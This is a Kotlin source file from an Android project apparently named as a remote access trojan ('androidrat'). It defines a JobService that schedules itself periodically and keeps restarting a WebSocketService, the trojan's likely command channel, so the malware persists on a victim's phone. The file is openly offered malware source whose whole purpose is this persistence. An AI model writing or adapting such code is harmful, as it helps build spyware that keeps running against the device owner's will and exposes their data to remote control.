package com.nqmgaming.androidrat.receivers

import android.app.job.JobInfo
import android.app.job.JobParameters
import android.app.job.JobScheduler
import android.app.job.JobService
import android.content.ComponentName
import android.content.Intent
import com.nqmgaming.androidrat.service.WebSocketService

class JobWakeUpService : JobService() {
    private var service: JobScheduler? = null
    private val JobId = 100

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val info = JobInfo.Builder(JobId, ComponentName(this, JobWakeUpService::class.java))
            .setPeriodic(2000)
            .build()
        service = getSystemService(JOB_SCHEDULER_SERVICE) as JobScheduler
        service!!.schedule(info)
        return START_STICKY
    }

    override fun onStartJob(params: JobParameters): Boolean {
        //Log.d(AppInfo.TAG,"Job Sheduler")
        startService(Intent(this, WebSocketService::class.java))
        return false
    }

    override fun onStopJob(params: JobParameters?): Boolean {
        return false
    }
}